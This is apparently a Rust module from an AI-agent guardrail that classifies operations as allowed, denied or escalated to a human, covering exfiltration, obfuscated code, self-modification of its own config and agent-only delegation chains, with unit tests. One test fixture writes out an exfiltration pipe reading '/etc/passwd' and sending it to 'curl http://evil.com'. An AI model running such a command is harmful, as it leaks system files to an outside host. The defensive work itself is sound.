use mc_core::id::PolicyId;
use mc_core::operation::{
    DataFlowDirection, Destructiveness, GoalRelevance, OperationClassification, OperationPattern,
    OperationRequest, Reversibility, TrustLevel,
};
use mc_core::policy::{
    EvaluationContext, PolicyDecision, PolicyDecisionKind, PolicyEvaluator, PolicyEvaluatorType,
};

/// A single deterministic rule that evaluates an operation request
/// and its classification, returning an optional policy decision.
struct DeterministicRule {
    name: String,
    evaluate:
        Box<dyn Fn(&OperationRequest, &OperationClassification) -> Option<PolicyDecisionKind> + Send + Sync>,
}

/// A deterministic rule that also has access to the evaluation context
/// (principal chain, trust levels, chain anomaly flags).
struct ContextAwareRule {
    name: String,
    evaluate:
        Box<dyn Fn(&OperationRequest, &OperationClassification, &EvaluationContext) -> Option<PolicyDecisionKind> + Send + Sync>,
}

/// Deterministic (rule-based) policy evaluator.
///
/// Evaluates hard rules against the operation classification axes.
/// Returns the first matching rule's decision, or `Allow` if no rule matches.
pub struct DeterministicEvaluator {
    rules: Vec<DeterministicRule>,
    context_rules: Vec<ContextAwareRule>,
}

impl DeterministicEvaluator {
    /// Create a new evaluator with all built-in rules from the Mission Clearance design.
    ///
    /// Built-in rules:
    /// 1. `no-catastrophic-destruction` -- DENY when destructiveness == Catastrophic AND reversibility == Irreversible
    /// 2. `no-exfiltration` -- DENY when data_flow == ExfiltrationSuspected
    /// 3. `no-self-modification` -- DENY when resource URI contains "mission-clearance" or "system-prompt"
    /// 4. `no-privilege-escalation` -- DENY when pattern == KnownMalicious
    /// 5. `unknown-destination-review` -- ESCALATE when data_flow == Outbound AND target_trust == Unknown
    /// 6. `goal-drift-detection` -- ESCALATE when goal_relevance == Unrelated OR Contradictory
    pub fn with_defaults() -> Self {
        let rules = vec![
            DeterministicRule {
                name: "no-catastrophic-destruction".to_string(),
                evaluate: Box::new(|_req, cls| {
                    if cls.destructiveness == Destructiveness::Catastrophic
                        && cls.reversibility == Reversibility::Irreversible
                    {
                        Some(PolicyDecisionKind::Deny)
                    } else {
                        None
                    }
                }),
            },
            DeterministicRule {
                name: "no-exfiltration".to_string(),
                evaluate: Box::new(|_req, cls| {
                    if cls.data_flow == DataFlowDirection::ExfiltrationSuspected {
                        Some(PolicyDecisionKind::Deny)
                    } else {
                        None
                    }
                }),
            },
            DeterministicRule {
                name: "no-self-modification".to_string(),
                evaluate: Box::new(|req, _cls| {
                    let uri = req.resource.as_str().to_lowercase();
                    // Only match MC's own config/policy/binary paths, not arbitrary
                    // project files in a directory that happens to contain "mission-clearance"
                    let mc_patterns = [
                        "mission-clearance/config/",
                        "mission-clearance/default-policies",
                        "mc-session.json",
                        "mc-approvals.json",
                        ".claude/settings",
                        "system-prompt",
                        "claude.md",
                    ];
                    if mc_patterns.iter().any(|p| uri.contains(p)) {
                        Some(PolicyDecisionKind::Deny)
                    } else {
                        None
                    }
                }),
            },
            DeterministicRule {
                name: "no-privilege-escalation".to_string(),
                evaluate: Box::new(|_req, cls| {
                    if cls.pattern == OperationPattern::KnownMalicious {
                        Some(PolicyDecisionKind::Deny)
                    } else {
                        None
                    }
                }),
            },
            // --- Signal-based deny rules (new) ---
            DeterministicRule {
                name: "signal-source-to-sink-exfiltration".to_string(),
                evaluate: Box::new(|_req, cls| {
                    if let Some(ref taint) = cls.signals.pipe_chain_taint {
                        if taint.source_to_sink_flow {
                            return Some(PolicyDecisionKind::Deny);
                        }
                    }
                    None
                }),
            },
            DeterministicRule {
                name: "signal-obfuscated-dynamic-code".to_string(),
                evaluate: Box::new(|_req, cls| {
                    if cls.signals.executes_dynamic_code
                        && cls.signals.uses_obfuscation
                        && cls.signals.dynamic_code_is_benign != Some(true)
                    {
                        Some(PolicyDecisionKind::Deny)
                    } else {
                        None
                    }
                }),
            },
            DeterministicRule {
                name: "signal-dynamic-code-with-network".to_string(),
                evaluate: Box::new(|_req, cls| {
                    if cls.signals.executes_dynamic_code && cls.signals.has_network_sink {
                        Some(PolicyDecisionKind::Deny)
                    } else {
                        None
                    }
                }),
            },
            // --- Signal-based allow rule: benign dynamic code ---
            DeterministicRule {
                name: "signal-benign-dynamic-code".to_string(),
                evaluate: Box::new(|_req, cls| {
                    if cls.signals.executes_dynamic_code
                        && cls.signals.dynamic_code_is_benign == Some(true)
                        && !cls.signals.reads_sensitive_source
                        && !cls.signals.has_network_sink
                        && !cls.signals.uses_obfuscation
                    {
                        Some(PolicyDecisionKind::Allow)
                    } else {
                        None
                    }
                }),
            },
            DeterministicRule {
                name: "suspicious-pattern-review".to_string(),
                evaluate: Box::new(|_req, cls| {
                    if cls.pattern == OperationPattern::Suspicious {
                        Some(PolicyDecisionKind::Escalate)
                    } else {
                        None
                    }
                }),
            },
            DeterministicRule {
                name: "unknown-destination-review".to_string(),
                evaluate: Box::new(|_req, cls| {
                    if cls.data_flow == DataFlowDirection::Outbound
                        && cls.target_trust == TrustLevel::Unknown
                    {
                        Some(PolicyDecisionKind::Escalate)
                    } else {
                        None
                    }
                }),
            },
            DeterministicRule {
                name: "persistence-point-review".to_string(),
                evaluate: Box::new(|req, _cls| {
                    if mc_kernel::classifier::OperationClassifier::is_persistence_target(
                        req.resource.as_str(),
                    ) {
                        Some(PolicyDecisionKind::Escalate)
                    } else {
                        None
                    }
                }),
            },
            // --- Signal-based escalate rules (new) ---
            DeterministicRule {
                name: "signal-persistence-with-network".to_string(),
                evaluate: Box::new(|_req, cls| {
                    if cls.signals.writes_persistence_point && cls.signals.has_network_sink {
                        Some(PolicyDecisionKind::Escalate)
                    } else {
                        None
                    }
                }),
            },
            DeterministicRule {
                name: "signal-security-modification".to_string(),
                evaluate: Box::new(|_req, cls| {
                    if cls.signals.modifies_security_controls {
                        Some(PolicyDecisionKind::Escalate)
                    } else {
                        None
                    }
                }),
            },
            DeterministicRule {
                name: "goal-drift-detection".to_string(),
                evaluate: Box::new(|_req, cls| {
                    if cls.goal_relevance == GoalRelevance::Unrelated
                        || cls.goal_relevance == GoalRelevance::Contradictory
                    {
                        Some(PolicyDecisionKind::Escalate)
                    } else {
                        None
                    }
                }),
            },
        ];

        let context_rules = vec![
            // --- Context-aware rules: trust level and chain anomalies ---
            ContextAwareRule {
                name: "agent-only-chain-escalate".to_string(),
                evaluate: Box::new(|_req, _cls, ctx| {
                    // If the entire chain is agents (no human root), escalate
                    if !ctx.principal_chain.is_empty()
                        && ctx.principal_chain.iter().all(|p| {
                            p.kind == mc_core::principal::PrincipalKind::AiAgent
                        })
                    {
                        Some(PolicyDecisionKind::Escalate)
                    } else {
                        None
                    }
                }),
            },
            ContextAwareRule {
                name: "low-trust-destructive-deny".to_string(),
                evaluate: Box::new(|_req, cls, ctx| {
                    // Agent-level trust + destructive operation = deny
                    if ctx.effective_trust_level
                        == Some(mc_core::principal::PrincipalTrustLevel::Agent)
                        && (cls.destructiveness == Destructiveness::High
                            || cls.destructiveness == Destructiveness::Catastrophic)
                    {
                        Some(PolicyDecisionKind::Deny)
                    } else {
                        None
                    }
                }),
            },
            ContextAwareRule {
                name: "chain-anomaly-unusual-depth".to_string(),
                evaluate: Box::new(|_req, _cls, ctx| {
                    if ctx.chain_anomaly_flags.iter().any(|f| {
                        matches!(f, mc_core::delegation::ChainAnomalyFlag::UnusualDepth { .. })
                    }) {
                        Some(PolicyDecisionKind::Escalate)
                    } else {
                        None
                    }
                }),
            },
            ContextAwareRule {
                name: "chain-anomaly-rapid-delegation".to_string(),
                evaluate: Box::new(|_req, _cls, ctx| {
                    if ctx.chain_anomaly_flags.iter().any(|f| {
                        matches!(
                            f,
                            mc_core::delegation::ChainAnomalyFlag::RapidDelegation { .. }
                        )
                    }) {
                        Some(PolicyDecisionKind::Escalate)
                    } else {
                        None
                    }
                }),
            },
            ContextAwareRule {
                name: "chain-anomaly-low-goal-coherence".to_string(),
                evaluate: Box::new(|_req, _cls, ctx| {
                    if ctx.chain_anomaly_flags.iter().any(|f| {
                        matches!(
                            f,
                            mc_core::delegation::ChainAnomalyFlag::LowGoalCoherence { score } if *score < 0.3
                        )
                    }) {
                        Some(PolicyDecisionKind::Deny)
                    } else if ctx.chain_anomaly_flags.iter().any(|f| {
                        matches!(
                            f,
                            mc_core::delegation::ChainAnomalyFlag::LowGoalCoherence { .. }
                        )
                    }) {
                        Some(PolicyDecisionKind::Escalate)
                    } else {
                        None
                    }
                }),
            },
        ];

        Self {
            rules,
            context_rules,
        }
    }

    /// Create a new evaluator with no rules (empty).
    pub fn new_empty() -> Self {
        Self {
            rules: Vec::new(),
            context_rules: Vec::new(),
        }
    }

    /// Add a custom rule to the evaluator.
    pub fn add_rule(
        &mut self,
        name: impl Into<String>,
        evaluate: impl Fn(&OperationRequest, &OperationClassification) -> Option<PolicyDecisionKind>
            + Send
            + Sync
            + 'static,
    ) {
        self.rules.push(DeterministicRule {
            name: name.into(),
            evaluate: Box::new(evaluate),
        });
    }

    /// Add a context-aware rule that has access to the evaluation context
    /// (principal chain, trust levels, chain anomaly flags).
    pub fn add_context_rule(
        &mut self,
        name: impl Into<String>,
        evaluate: impl Fn(&OperationRequest, &OperationClassification, &EvaluationContext) -> Option<PolicyDecisionKind>
            + Send
            + Sync
            + 'static,
    ) {
        self.context_rules.push(ContextAwareRule {
            name: name.into(),
            evaluate: Box::new(evaluate),
        });
    }
}

impl PolicyEvaluator for DeterministicEvaluator {
    fn evaluate(
        &self,
        request: &OperationRequest,
        classification: &OperationClassification,
        context: &EvaluationContext,
    ) -> PolicyDecision {
        // Execute-after-write check: escalate when executing a file written in the same session
        if context.executes_session_written_file {
            return PolicyDecision {
                policy_id: PolicyId::new(),
                kind: PolicyDecisionKind::Escalate,
                reasoning: "Rule 'execute-after-write-review' triggered".to_string(),
                evaluator: PolicyEvaluatorType::Deterministic,
            };
        }

        for rule in &self.rules {
            if let Some(kind) = (rule.evaluate)(request, classification) {
                return PolicyDecision {
                    policy_id: PolicyId::new(),
                    kind,
                    reasoning: format!("Rule '{}' triggered", rule.name),
                    evaluator: PolicyEvaluatorType::Deterministic,
                };
            }
        }

        // Context-aware rules (trust level, chain anomalies)
        for rule in &self.context_rules {
            if let Some(kind) = (rule.evaluate)(request, classification, context) {
                return PolicyDecision {
                    policy_id: PolicyId::new(),
                    kind,
                    reasoning: format!("Rule '{}' triggered", rule.name),
                    evaluator: PolicyEvaluatorType::Deterministic,
                };
            }
        }

        // No rule matched: allow
        PolicyDecision {
            policy_id: PolicyId::new(),
            kind: PolicyDecisionKind::Allow,
            reasoning: "No deterministic rule triggered".to_string(),
            evaluator: PolicyEvaluatorType::Deterministic,
        }
    }

    fn evaluator_type(&self) -> PolicyEvaluatorType {
        PolicyEvaluatorType::Deterministic
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use chrono::Utc;
    use mc_core::id::{MissionId, RequestId};
    use mc_core::operation::{
        BlastRadius, DataFlowDirection, Destructiveness, GoalRelevance, Operation,
        OperationClassification, OperationContext, OperationPattern, OperationSignals,
        Reversibility, TrustLevel,
    };
    use mc_core::resource::ResourceUri;

    fn default_context() -> EvaluationContext {
        EvaluationContext {
            mission_goal: "test mission".to_string(),
            mission_chain: vec![],
            recent_operations: vec![],
            anomaly_history: vec![],
            executes_session_written_file: false,
            principal_chain: vec![],
            effective_trust_level: None,
            chain_anomaly_flags: vec![],
        }
    }

    fn make_request(resource_uri: &str) -> OperationRequest {
        OperationRequest {
            id: RequestId::new(),
            mission_id: MissionId::new(),
            resource: ResourceUri::new(resource_uri).unwrap(),
            operation: Operation::Execute,
            context: OperationContext::Shell {
                command: "test".to_string(),
                args: vec![],
                working_dir: None,
            },
            justification: "test".to_string(),
            chain: vec![],
            timestamp: Utc::now(),
        }
    }

    fn make_classification(
        destructiveness: Destructiveness,
        reversibility: Reversibility,
        data_flow: DataFlowDirection,
        target_trust: TrustLevel,
        pattern: OperationPattern,
        goal_relevance: GoalRelevance,
    ) -> OperationClassification {
        OperationClassification {
            destructiveness,
            reversibility,
            blast_radius: BlastRadius::Single,
            data_flow,
            target_trust,
            pattern,
            goal_relevance,
            signals: OperationSignals::default(),
        }
    }

    fn normal_classification() -> OperationClassification {
        make_classification(
            Destructiveness::None,
            Reversibility::Reversible,
            DataFlowDirection::Internal,
            TrustLevel::Known,
            OperationPattern::Normal,
            GoalRelevance::DirectlyRelevant,
        )
    }

    #[test]
    fn deny_catastrophic_irreversible() {
        let eval = DeterministicEvaluator::with_defaults();
        let req = make_request("shell://localhost/bin");
        let cls = make_classification(
            Destructiveness::Catastrophic,
            Reversibility::Irreversible,
            DataFlowDirection::Internal,
            TrustLevel::Known,
            OperationPattern::Normal,
            GoalRelevance::DirectlyRelevant,
        );
        let decision = eval.evaluate(&req, &cls, &default_context());
        assert_eq!(decision.kind, PolicyDecisionKind::Deny);
        assert!(decision.reasoning.contains("no-catastrophic-destruction"));
    }

    #[test]
    fn allow_catastrophic_reversible() {
        let eval = DeterministicEvaluator::with_defaults();
        let req = make_request("shell://localhost/bin");
        let cls = make_classification(
            Destructiveness::Catastrophic,
            Reversibility::Reversible,
            DataFlowDirection::Internal,
            TrustLevel::Known,
            OperationPattern::Normal,
            GoalRelevance::DirectlyRelevant,
        );
        let decision = eval.evaluate(&req, &cls, &default_context());
        assert_eq!(decision.kind, PolicyDecisionKind::Allow);
    }

    #[test]
    fn deny_exfiltration() {
        let eval = DeterministicEvaluator::with_defaults();
        let req = make_request("shell://localhost/bin");
        let cls = make_classification(
            Destructiveness::None,
            Reversibility::Reversible,
            DataFlowDirection::ExfiltrationSuspected,
            TrustLevel::Known,
            OperationPattern::Normal,
            GoalRelevance::DirectlyRelevant,
        );
        let decision = eval.evaluate(&req, &cls, &default_context());
        assert_eq!(decision.kind, PolicyDecisionKind::Deny);
        assert!(decision.reasoning.contains("no-exfiltration"));
    }

    #[test]
    fn deny_self_modification_mission_clearance() {
        let eval = DeterministicEvaluator::with_defaults();
        let req = make_request("file://localhost/home/user/mission-clearance/config/default.toml");
        let cls = normal_classification();
        let decision = eval.evaluate(&req, &cls, &default_context());
        assert_eq!(decision.kind, PolicyDecisionKind::Deny);
        assert!(decision.reasoning.contains("no-self-modification"));
    }

    #[test]
    fn deny_self_modification_system_prompt() {
        let eval = DeterministicEvaluator::with_defaults();
        let req = make_request("file://localhost/etc/system-prompt.txt");
        let cls = normal_classification();
        let decision = eval.evaluate(&req, &cls, &default_context());
        assert_eq!(decision.kind, PolicyDecisionKind::Deny);
        assert!(decision.reasoning.contains("no-self-modification"));
    }

    #[test]
    fn deny_known_malicious() {
        let eval = DeterministicEvaluator::with_defaults();
        let req = make_request("shell://localhost/bin");
        let cls = make_classification(
            Destructiveness::None,
            Reversibility::Reversible,
            DataFlowDirection::Internal,
            TrustLevel::Known,
            OperationPattern::KnownMalicious,
            GoalRelevance::DirectlyRelevant,
        );
        let decision = eval.evaluate(&req, &cls, &default_context());
        assert_eq!(decision.kind, PolicyDecisionKind::Deny);
        assert!(decision.reasoning.contains("no-privilege-escalation"));
    }

    #[test]
    fn escalate_suspicious_pattern() {
        let eval = DeterministicEvaluator::with_defaults();
        let req = make_request("shell://localhost/bin");
        let cls = make_classification(
            Destructiveness::None,
            Reversibility::Reversible,
            DataFlowDirection::Internal,
            TrustLevel::Known,
            OperationPattern::Suspicious,
            GoalRelevance::DirectlyRelevant,
        );
        let decision = eval.evaluate(&req, &cls, &default_context());
        assert_eq!(decision.kind, PolicyDecisionKind::Escalate);
        assert!(decision.reasoning.contains("suspicious-pattern-review"));
    }

    #[test]
    fn escalate_unknown_destination() {
        let eval = DeterministicEvaluator::with_defaults();
        let req = make_request("http://suspicious-site.xyz/data");
        let cls = make_classification(
            Destructiveness::None,
            Reversibility::Reversible,
            DataFlowDirection::Outbound,
            TrustLevel::Unknown,
            OperationPattern::Normal,
            GoalRelevance::DirectlyRelevant,
        );
        let decision = eval.evaluate(&req, &cls, &default_context());
        assert_eq!(decision.kind, PolicyDecisionKind::Escalate);
        assert!(decision.reasoning.contains("unknown-destination-review"));
    }

    #[test]
    fn escalate_goal_drift_unrelated() {
        let eval = DeterministicEvaluator::with_defaults();
        let req = make_request("shell://localhost/bin");
        let cls = make_classification(
            Destructiveness::None,
            Reversibility::Reversible,
            DataFlowDirection::Internal,
            TrustLevel::Known,
            OperationPattern::Normal,
            GoalRelevance::Unrelated,
        );
        let decision = eval.evaluate(&req, &cls, &default_context());
        assert_eq!(decision.kind, PolicyDecisionKind::Escalate);
        assert!(decision.reasoning.contains("goal-drift-detection"));
    }

    #[test]
    fn escalate_goal_drift_contradictory() {
        let eval = DeterministicEvaluator::with_defaults();
        let req = make_request("shell://localhost/bin");
        let cls = make_classification(
            Destructiveness::None,
            Reversibility::Reversible,
            DataFlowDirection::Internal,
            TrustLevel::Known,
            OperationPattern::Normal,
            GoalRelevance::Contradictory,
        );
        let decision = eval.evaluate(&req, &cls, &default_context());
        assert_eq!(decision.kind, PolicyDecisionKind::Escalate);
        assert!(decision.reasoning.contains("goal-drift-detection"));
    }

    #[test]
    fn allow_normal_operation() {
        let eval = DeterministicEvaluator::with_defaults();
        let req = make_request("shell://localhost/bin");
        let cls = normal_classification();
        let decision = eval.evaluate(&req, &cls, &default_context());
        assert_eq!(decision.kind, PolicyDecisionKind::Allow);
        assert!(decision.reasoning.contains("No deterministic rule triggered"));
    }

    #[test]
    fn custom_rule_fires() {
        let mut eval = DeterministicEvaluator::new_empty();
        eval.add_rule("custom-deny-all", |_req, _cls| {
            Some(PolicyDecisionKind::Deny)
        });
        let req = make_request("shell://localhost/bin");
        let cls = normal_classification();
        let decision = eval.evaluate(&req, &cls, &default_context());
        assert_eq!(decision.kind, PolicyDecisionKind::Deny);
        assert!(decision.reasoning.contains("custom-deny-all"));
    }

    #[test]
    fn empty_evaluator_allows() {
        let eval = DeterministicEvaluator::new_empty();
        let req = make_request("shell://localhost/bin");
        let cls = normal_classification();
        let decision = eval.evaluate(&req, &cls, &default_context());
        assert_eq!(decision.kind, PolicyDecisionKind::Allow);
    }

    #[test]
    fn first_matching_rule_wins() {
        // Both exfiltration and known-malicious could match,
        // but exfiltration comes first in the default ordering.
        let eval = DeterministicEvaluator::with_defaults();
        let req = make_request("shell://localhost/bin");
        let cls = make_classification(
            Destructiveness::None,
            Reversibility::Reversible,
            DataFlowDirection::ExfiltrationSuspected,
            TrustLevel::Known,
            OperationPattern::KnownMalicious,
            GoalRelevance::DirectlyRelevant,
        );
        let decision = eval.evaluate(&req, &cls, &default_context());
        assert_eq!(decision.kind, PolicyDecisionKind::Deny);
        // exfiltration rule fires first
        assert!(decision.reasoning.contains("no-exfiltration"));
    }

    #[test]
    fn escalate_persistence_target() {
        let eval = DeterministicEvaluator::with_defaults();
        let req = make_request("file:///project/.git/hooks/pre-commit");
        let cls = normal_classification();
        let decision = eval.evaluate(&req, &cls, &default_context());
        assert_eq!(decision.kind, PolicyDecisionKind::Escalate);
        assert!(decision.reasoning.contains("persistence-point-review"));
    }

    #[test]
    fn allow_non_persistence_target() {
        let eval = DeterministicEvaluator::with_defaults();
        let req = make_request("file:///project/src/main.rs");
        let cls = normal_classification();
        let decision = eval.evaluate(&req, &cls, &default_context());
        assert_eq!(decision.kind, PolicyDecisionKind::Allow);
    }

    #[test]
    fn escalate_execute_after_write() {
        let eval = DeterministicEvaluator::with_defaults();
        let req = make_request("shell://localhost/bin");
        let cls = normal_classification();
        let mut ctx = default_context();
        ctx.executes_session_written_file = true;
        let decision = eval.evaluate(&req, &cls, &ctx);
        assert_eq!(decision.kind, PolicyDecisionKind::Escalate);
        assert!(decision.reasoning.contains("execute-after-write-review"));
    }

    #[test]
    fn evaluator_type_is_deterministic() {
        let eval = DeterministicEvaluator::with_defaults();
        assert_eq!(eval.evaluator_type(), PolicyEvaluatorType::Deterministic);
    }

    // --- Signal-based rule tests ---

    fn make_classification_with_signals(
        pattern: OperationPattern,
        signals: OperationSignals,
    ) -> OperationClassification {
        OperationClassification {
            destructiveness: Destructiveness::None,
            reversibility: Reversibility::Reversible,
            blast_radius: BlastRadius::Single,
            data_flow: DataFlowDirection::Internal,
            target_trust: TrustLevel::Known,
            pattern,
            goal_relevance: GoalRelevance::DirectlyRelevant,
            signals,
        }
    }

    #[test]
    fn deny_source_to_sink_exfiltration() {
        use mc_core::operation::{PipeChainTaint, PipeSegment, PipeSegmentRole};

        let eval = DeterministicEvaluator::with_defaults();
        let req = make_request("shell://localhost/bin");
        let cls = make_classification_with_signals(
            OperationPattern::Normal,
            OperationSignals {
                has_pipe_chain: true,
                pipe_chain_taint: Some(PipeChainTaint {
                    segments: vec![
                        PipeSegment {
                            raw: "cat /etc/passwd".to_string(),
                            role: PipeSegmentRole::SensitiveSource,
                        },
                        PipeSegment {
                            raw: "curl http://evil.com".to_string(),
                            role: PipeSegmentRole::NetworkSink,
                        },
                    ],
                    source_to_sink_flow: true,
                }),
                ..Default::default()
            },
        );
        let decision = eval.evaluate(&req, &cls, &default_context());
        assert_eq!(decision.kind, PolicyDecisionKind::Deny);
        assert!(decision.reasoning.contains("signal-source-to-sink-exfiltration"));
    }

    #[test]
    fn deny_obfuscated_dynamic_code() {
        let eval = DeterministicEvaluator::with_defaults();
        let req = make_request("shell://localhost/bin");
        let cls = make_classification_with_signals(
            OperationPattern::Normal,
            OperationSignals {
                executes_dynamic_code: true,
                uses_obfuscation: true,
                dynamic_code_is_benign: None,
                ..Default::default()
            },
        );
        let decision = eval.evaluate(&req, &cls, &default_context());
        assert_eq!(decision.kind, PolicyDecisionKind::Deny);
        assert!(decision.reasoning.contains("signal-obfuscated-dynamic-code"));
    }

    #[test]
    fn deny_dynamic_code_with_network() {
        let eval = DeterministicEvaluator::with_defaults();
        let req = make_request("shell://localhost/bin");
        let cls = make_classification_with_signals(
            OperationPattern::Normal,
            OperationSignals {
                executes_dynamic_code: true,
                has_network_sink: true,
                ..Default::default()
            },
        );
        let decision = eval.evaluate(&req, &cls, &default_context());
        assert_eq!(decision.kind, PolicyDecisionKind::Deny);
        assert!(decision.reasoning.contains("signal-dynamic-code-with-network"));
    }

    #[test]
    fn allow_benign_dynamic_code() {
        let eval = DeterministicEvaluator::with_defaults();
        let req = make_request("shell://localhost/bin");
        let cls = make_classification_with_signals(
            OperationPattern::Suspicious, // would normally escalate
            OperationSignals {
                executes_dynamic_code: true,
                dynamic_code_is_benign: Some(true),
                ..Default::default()
            },
        );
        let decision = eval.evaluate(&req, &cls, &default_context());
        assert_eq!(decision.kind, PolicyDecisionKind::Allow);
        assert!(decision.reasoning.contains("signal-benign-dynamic-code"));
    }

    #[test]
    fn benign_dynamic_code_not_allowed_with_network() {
        let eval = DeterministicEvaluator::with_defaults();
        let req = make_request("shell://localhost/bin");
        let cls = make_classification_with_signals(
            OperationPattern::Suspicious,
            OperationSignals {
                executes_dynamic_code: true,
                dynamic_code_is_benign: Some(true),
                has_network_sink: true, // this overrides benign
                ..Default::default()
            },
        );
        let decision = eval.evaluate(&req, &cls, &default_context());
        // signal-dynamic-code-with-network fires first (deny)
        assert_eq!(decision.kind, PolicyDecisionKind::Deny);
    }

    #[test]
    fn escalate_persistence_with_network() {
        let eval = DeterministicEvaluator::with_defaults();
        let req = make_request("shell://localhost/bin");
        let cls = make_classification_with_signals(
            OperationPattern::Normal,
            OperationSignals {
                writes_persistence_point: true,
                has_network_sink: true,
                ..Default::default()
            },
        );
        let decision = eval.evaluate(&req, &cls, &default_context());
        assert_eq!(decision.kind, PolicyDecisionKind::Escalate);
        assert!(decision.reasoning.contains("signal-persistence-with-network"));
    }

    #[test]
    fn escalate_security_modification() {
        let eval = DeterministicEvaluator::with_defaults();
        let req = make_request("shell://localhost/bin");
        let cls = make_classification_with_signals(
            OperationPattern::Normal,
            OperationSignals {
                modifies_security_controls: true,
                ..Default::default()
            },
        );
        let decision = eval.evaluate(&req, &cls, &default_context());
        assert_eq!(decision.kind, PolicyDecisionKind::Escalate);
        assert!(decision.reasoning.contains("signal-security-modification"));
    }

    // --- Context-aware rule tests ---

    #[test]
    fn escalate_agent_only_chain() {
        let eval = DeterministicEvaluator::with_defaults();
        let req = make_request("shell://localhost/bin");
        let cls = normal_classification();
        let mut ctx = default_context();
        ctx.principal_chain = vec![
            mc_core::principal::PrincipalSummary {
                id: mc_core::id::PrincipalId::new(),
                kind: mc_core::principal::PrincipalKind::AiAgent,
                trust_level: mc_core::principal::PrincipalTrustLevel::Agent,
                display_name: "Agent-1".to_string(),
            },
            mc_core::principal::PrincipalSummary {
                id: mc_core::id::PrincipalId::new(),
                kind: mc_core::principal::PrincipalKind::AiAgent,
                trust_level: mc_core::principal::PrincipalTrustLevel::Agent,
                display_name: "Agent-2".to_string(),
            },
        ];
        let decision = eval.evaluate(&req, &cls, &ctx);
        assert_eq!(decision.kind, PolicyDecisionKind::Escalate);
        assert!(decision.reasoning.contains("agent-only-chain-escalate"));
    }

    #[test]
    fn allow_chain_with_human_root() {
        let eval = DeterministicEvaluator::with_defaults();
        let req = make_request("shell://localhost/bin");
        let cls = normal_classification();
        let mut ctx = default_context();
        ctx.principal_chain = vec![
            mc_core::principal::PrincipalSummary {
                id: mc_core::id::PrincipalId::new(),
                kind: mc_core::principal::PrincipalKind::Human,
                trust_level: mc_core::principal::PrincipalTrustLevel::Human,
                display_name: "Alice".to_string(),
            },
            mc_core::principal::PrincipalSummary {
                id: mc_core::id::PrincipalId::new(),
                kind: mc_core::principal::PrincipalKind::AiAgent,
                trust_level: mc_core::principal::PrincipalTrustLevel::Agent,
                display_name: "Agent-1".to_string(),
            },
        ];
        let decision = eval.evaluate(&req, &cls, &ctx);
        assert_eq!(decision.kind, PolicyDecisionKind::Allow);
    }

    #[test]
    fn deny_low_trust_destructive() {
        let eval = DeterministicEvaluator::with_defaults();
        let req = make_request("shell://localhost/bin");
        let cls = make_classification(
            Destructiveness::High,
            Reversibility::Reversible,
            DataFlowDirection::Internal,
            TrustLevel::Known,
            OperationPattern::Normal,
            GoalRelevance::DirectlyRelevant,
        );
        let mut ctx = default_context();
        ctx.effective_trust_level = Some(mc_core::principal::PrincipalTrustLevel::Agent);
        let decision = eval.evaluate(&req, &cls, &ctx);
        assert_eq!(decision.kind, PolicyDecisionKind::Deny);
        assert!(decision.reasoning.contains("low-trust-destructive-deny"));
    }

    #[test]
    fn allow_human_trust_destructive() {
        let eval = DeterministicEvaluator::with_defaults();
        let req = make_request("shell://localhost/bin");
        let cls = make_classification(
            Destructiveness::High,
            Reversibility::Reversible,
            DataFlowDirection::Internal,
            TrustLevel::Known,
            OperationPattern::Normal,
            GoalRelevance::DirectlyRelevant,
        );
        let mut ctx = default_context();
        ctx.effective_trust_level = Some(mc_core::principal::PrincipalTrustLevel::Human);
        let decision = eval.evaluate(&req, &cls, &ctx);
        assert_eq!(decision.kind, PolicyDecisionKind::Allow);
    }

    #[test]
    fn escalate_unusual_depth_anomaly() {
        let eval = DeterministicEvaluator::with_defaults();
        let req = make_request("shell://localhost/bin");
        let cls = normal_classification();
        let mut ctx = default_context();
        ctx.chain_anomaly_flags = vec![mc_core::delegation::ChainAnomalyFlag::UnusualDepth {
            depth: 12,
            median: 3,
        }];
        let decision = eval.evaluate(&req, &cls, &ctx);
        assert_eq!(decision.kind, PolicyDecisionKind::Escalate);
        assert!(decision.reasoning.contains("chain-anomaly-unusual-depth"));
    }

    #[test]
    fn escalate_rapid_delegation_anomaly() {
        let eval = DeterministicEvaluator::with_defaults();
        let req = make_request("shell://localhost/bin");
        let cls = normal_classification();
        let mut ctx = default_context();
        ctx.chain_anomaly_flags =
            vec![mc_core::delegation::ChainAnomalyFlag::RapidDelegation {
                levels: 4,
                seconds: 1.5,
            }];
        let decision = eval.evaluate(&req, &cls, &ctx);
        assert_eq!(decision.kind, PolicyDecisionKind::Escalate);
        assert!(decision.reasoning.contains("chain-anomaly-rapid-delegation"));
    }

    #[test]
    fn deny_very_low_goal_coherence() {
        let eval = DeterministicEvaluator::with_defaults();
        let req = make_request("shell://localhost/bin");
        let cls = normal_classification();
        let mut ctx = default_context();
        ctx.chain_anomaly_flags =
            vec![mc_core::delegation::ChainAnomalyFlag::LowGoalCoherence { score: 0.1 }];
        let decision = eval.evaluate(&req, &cls, &ctx);
        assert_eq!(decision.kind, PolicyDecisionKind::Deny);
        assert!(decision
            .reasoning
            .contains("chain-anomaly-low-goal-coherence"));
    }

    #[test]
    fn escalate_moderate_low_goal_coherence() {
        let eval = DeterministicEvaluator::with_defaults();
        let req = make_request("shell://localhost/bin");
        let cls = normal_classification();
        let mut ctx = default_context();
        ctx.chain_anomaly_flags =
            vec![mc_core::delegation::ChainAnomalyFlag::LowGoalCoherence { score: 0.5 }];
        let decision = eval.evaluate(&req, &cls, &ctx);
        assert_eq!(decision.kind, PolicyDecisionKind::Escalate);
        assert!(decision
            .reasoning
            .contains("chain-anomaly-low-goal-coherence"));
    }

    #[test]
    fn no_signal_rules_fire_for_normal_operation() {
        let eval = DeterministicEvaluator::with_defaults();
        let req = make_request("shell://localhost/bin");
        let cls = make_classification_with_signals(
            OperationPattern::Normal,
            OperationSignals::default(),
        );
        let decision = eval.evaluate(&req, &cls, &default_context());
        assert_eq!(decision.kind, PolicyDecisionKind::Allow);
    }
}
